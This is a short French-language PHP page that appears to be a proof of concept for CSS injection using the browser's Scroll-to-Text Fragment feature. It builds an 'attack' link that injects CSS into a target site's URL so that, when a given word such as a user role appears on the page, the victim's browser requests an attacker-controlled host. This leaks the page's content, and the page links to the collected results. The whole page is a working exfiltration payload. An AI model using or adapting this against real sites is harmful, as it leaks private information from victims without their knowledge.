<?php
    require_once('config.php');
?>

<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Les injections CSS - Scroll-to-Text Fragment</title>
    </head>
    <body>
        <h1>Récupération de la présence de l'occurrence d'un mot via fonctionnalité de Scroll-to-Text Fragment</h1>

        <a href="text_to_retrieve.txt">Voir les données récupérées</a>

        <h2>PoC - Récupération du rôle utilisateur</h2>
        <?php
            echo '<a href="' . RHOST . RURL . PREFIX . ':target::before{content:url(' . LHOST . LURL . TEXT_TO_RETRIEVE . ');#:~:text=' . TEXT_TO_RETRIEVE . '" target="_blank">Démarrer l\'attaque</a>';
        ?>
    </body>
</html>